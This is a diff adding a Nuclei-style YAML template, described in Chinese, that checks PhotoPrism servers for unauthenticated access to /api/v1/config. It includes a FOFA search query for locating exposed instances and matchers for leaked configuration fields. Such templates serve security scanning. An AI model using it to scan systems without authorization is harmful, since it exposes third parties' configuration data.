@@ -1,0 +1,29 @@
+id: photoprism-unauthorized-access
+
+info:
+  name: PhotoPrism未授权访问漏洞
+  author: onewin
+  severity: medium
+  description: |
+    PhotoPrism私有相册系统的/api/v1/config接口存在未授权访问漏洞，可泄露系统敏感配置信息
+    [漏洞发现时间：2025年7月]
+  metadata:
+    fofa-query: 'title="PhotoPrism"'
+  tags: PhotoPrism-开源照片管理系统
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "version"
+          - "apiUri"
+          - "passwordResetUri"
+        part: body
+        condition: and
